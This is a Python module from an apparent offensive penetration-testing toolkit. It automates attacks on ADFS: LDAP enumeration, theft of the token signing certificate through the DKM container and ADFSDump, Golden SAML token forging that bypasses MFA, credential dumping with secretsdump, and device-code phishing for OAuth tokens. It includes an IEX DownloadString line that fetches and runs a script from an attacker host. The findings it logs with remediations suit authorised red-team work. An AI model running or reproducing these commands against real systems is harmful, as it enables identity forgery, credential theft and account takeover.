"""
Module: ADFS & Golden SAML Attacks
Techniques:
  - ADFS server enumeration
  - Token Signing Certificate theft (DKM container / LDAP thumbnailPhoto)
  - Golden SAML token forging (AADInternals, ADFSDump)
  - ADFS service account credential extraction
  - WS-Federation / OAuth2 token abuse
  Reference: Used by NOBELIUM/APT29 in SolarWinds breach
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── ADFS & GOLDEN SAML ATTACKS ──────────────────────────────────
  [1]  Enumerate ADFS (servers, endpoints, relying parties)
  [2]  Extract Token Signing Cert via DKM (LDAP — no ADFS access)
  [3]  Extract Token Signing Cert from ADFS server (ADFSDump)
  [4]  Forge Golden SAML Token          (AADInternals)
  [5]  ADFS Service Account Abuse       (ntds → ADFS sync)
  [6]  OAuth2 / WS-Fed token theft      (device code flow)
  [0]  Back
"""


def run():
    print_banner("ADFS ATTACKS", "Golden SAML & Token Signing Certificate Theft")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    base_dn = "DC=" + dom.replace(".", ",DC=")
    ldap_b  = f"ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' -w '{pw}' -b '{base_dn}'"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Enumerate ADFS ────────────────────────────────────────────────────
    if c == "1":
        info("Enumerating ADFS servers and configuration...")
        # Find ADFS via SCP (Service Connection Point)
        run_cmd(
            f"{ldap_b} '(objectClass=serviceConnectionPoint)' "
            f"serviceBindingInformation keywords",
            capture=False)
        # Find ADFS service account
        run_cmd(
            f"{ldap_b} '(servicePrincipalName=adfs/*)' "
            f"sAMAccountName servicePrincipalName",
            capture=False)
        # DNS lookup for ADFS
        run_cmd(f"nslookup sts.{dom} {dc}")
        run_cmd(f"nslookup adfs.{dom} {dc}")
        print(f"""
  {NEON_CYN}ADFS Metadata Endpoints (check from browser/curl):{RST}
  https://sts.{dom}/adfs/ls/idpinitiatedsignon
  https://sts.{dom}/FederationMetadata/2007-06/FederationMetadata.xml
  https://sts.{dom}/adfs/.well-known/openid-configuration

  {NEON_CYN}ADFS via AADInternals (PowerShell):{RST}
  Get-AADIntLoginInformation -Domain {dom}
  Get-AADIntTenantDomains -Domain {dom}
""")

    # ── [2] DKM token signing cert via LDAP ───────────────────────────────────
    elif c == "2":
        print(f"""
  {NEON_CYN}Extract ADFS Token Signing Certificate via DKM Container:{RST}
  {DIM}The ADFS Token Signing Certificate private key is stored encrypted
  in Active Directory in the DKM (Distributed Key Manager) container.
  AD admins can read this — no ADFS server access required!
  The thumbnailPhoto attribute contains the encrypted cert material.{RST}

  ── LDAP query for DKM container ─────────────────────────────────────────
""")
        run_cmd(
            f"ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' -w '{pw}' "
            f"-b 'CN=ADFS,CN=Microsoft,CN=Program Data,{base_dn}' "
            f"thumbnailPhoto",
            capture=False)
        print(f"""
  ── ADFSDump.py (Mandiant) ────────────────────────────────────────────────
  python3 /opt/ADFSDump/ADFSDump.py --server {dc} --domain {dom} \\
    --username {user} --password '{pw}'
  # Outputs: token_signing_cert.pem + private key

  ── AADInternals (if on ADFS server) ──────────────────────────────────────
  # Run on ADFS server as admin:
  Export-AADIntADFSSigningCertificate
  Export-AADIntADFSEncryptionCertificate
""")
        add_finding("ADFS DKM Container Accessible", "Critical",
                    "ADFS Token Signing Certificate extractable via DKM LDAP container",
                    "Restrict DKM container ACL to ADFS service account only")

    # ── [3] ADFSDump from ADFS server ─────────────────────────────────────────
    elif c == "3":
        adfs_server = prompt(f"ADFS server IP/hostname (default: sts.{dom})") or f"sts.{dom}"
        print(f"""
  {NEON_CYN}Extract Token Signing Certificate from ADFS Server:{RST}
  {DIM}Requires admin access to the ADFS server (lateral movement first).{RST}

  ── ADFSDump (Mandiant/FireEye) ───────────────────────────────────────────
  python3 /opt/ADFSDump/ADFSDump.py --server {adfs_server} \\
    --domain {dom} --username {user} --password '{pw}'

  ── Via secretsdump (after DC compromise) ────────────────────────────────
  {imp('secretsdump.py')} {dom}/{user}:'{pw}'@{adfs_server}
  # Look for: ADFS service account NTLM hash
  # Then decode DKM from LDAP

  ── Invoke-ADFSDump (PowerShell — run on ADFS server) ────────────────────
  IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-ADFSDump.ps1')
  Invoke-ADFSDump

  ── AADInternals ─────────────────────────────────────────────────────────
  Import-Module AADInternals
  $creds = Get-Credential
  Open-AADIntOffice365Portal -Credentials $creds
  Export-AADIntADFSSigningCertificate -Filename signing.pfx
""")

    # ── [4] Golden SAML forging ───────────────────────────────────────────────
    elif c == "4":
        target_user = prompt("User to impersonate (e.g. admin@tenant.onmicrosoft.com)")
        print(f"""
  {NEON_CYN}Golden SAML — Forge SAML Assertion for Any User:{RST}
  {DIM}With the Token Signing Certificate, forge SAML assertions impersonating
  ANY user in ANY federated application (Azure AD, Salesforce, etc.).
  Bypasses MFA entirely. Used by NOBELIUM/APT29 in SolarWinds breach.
  Token signing certs typically last 1 year — hard to rotate in prod.{RST}

  ── Prerequisites ────────────────────────────────────────────────────────
  1. token_signing.pfx (from step [2] or [3])
  2. ADFS federation metadata URL or Relying Party Identifier

  ── AADInternals — Forge Golden SAML ────────────────────────────────────
  # Get federation info
  $info = Get-AADIntLoginInformation -Domain {dom}

  # Forge token (impersonate {target_user})
  New-AADIntSAMLToken -ImmutableID "<user_immutableID>" \\
    -PfxFileName signing.pfx -PfxPassword "" \\
    -Issuer "http://sts.{dom}/adfs/services/trust" \\
    -Audience "urn:federation:MicrosoftOnline"

  # Use token to get access
  Open-AADIntOffice365Portal -SAMLToken $token

  ── shimit (Golden SAML tool) ────────────────────────────────────────────
  python3 /opt/shimit/shimit.py \\
    -idp http://sts.{dom}/adfs/services/trust \\
    -pk token_signing_key.pem \\
    -c token_signing_cert.pem \\
    -u {target_user} \\
    -n {target_user.split('@')[0] if '@' in target_user else target_user} \\
    -r "urn:federation:MicrosoftOnline" \\
    -s "domain_sid" \\
    --upn {target_user}
""")
        add_finding("Golden SAML Token Forged", "Critical",
                    f"ADFS Token Signing Certificate used to forge SAML assertions as {target_user}",
                    "Rotate Token Signing Certificate immediately; monitor SAML assertion anomalies; "
                    "implement Defender for Identity ADFS sensors")

    # ── [5] ADFS service account ──────────────────────────────────────────────
    elif c == "5":
        print(f"""
  {NEON_CYN}ADFS Service Account Abuse:{RST}
  {DIM}The ADFS service account has access to DKM keys in AD.
  After DCSync or secretsdump, check for ADFS service account hash.{RST}

  ── Find ADFS service account ────────────────────────────────────────────
  {ldap_b} '(servicePrincipalName=host/adfs*)' sAMAccountName memberOf

  ── After getting hash — read DKM directly ───────────────────────────────
  {imp('secretsdump.py')} {dom}/{user}:'{pw}'@{dc} \\
    -just-dc-user ADFS_ACCOUNT

  ── AADConnect — MSOL account (PHS sync) ─────────────────────────────────
  {imp('secretsdump.py')} {dom}/MSOL_ACCOUNT:'<password>'@{dc} -just-dc-ntlm
  # MSOL account syncs all AD hashes to Azure AD — equivalent to DCSync!
""")

    # ── [6] Device code flow ──────────────────────────────────────────────────
    elif c == "6":
        print(f"""
  {NEON_CYN}OAuth2 Device Code Flow — Token Theft (Phishing):{RST}
  {DIM}Generates a device code, sends to victim — victim logs in,
  attacker captures the OAuth2 access + refresh token.
  Works for Azure AD / M365 even with MFA if victim approves.{RST}

  ── AADInternals ─────────────────────────────────────────────────────────
  Import-Module AADInternals
  $token = Get-AADIntAccessTokenForMSGraph -Device -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
  # Sends: https://microsoft.com/devicelogin + code to victim
  # Captures: access_token, refresh_token, tenant_id

  ── TokenTacticsV2 / Token_Steal ─────────────────────────────────────────
  python3 /opt/TokenTacticsV2/invoke_devicecode.py --tenant {dom}

  ── Use captured token ───────────────────────────────────────────────────
  # Access Graph API
  curl -H "Authorization: Bearer $token" \\
    https://graph.microsoft.com/v1.0/me
  # Access SharePoint, Teams, Exchange
""")
        add_finding("Device Code Phishing Vector", "High",
                    "Device code flow can be used to steal Azure AD tokens bypassing MFA",
                    "Disable device code flow via Conditional Access; implement token binding")

    pause()
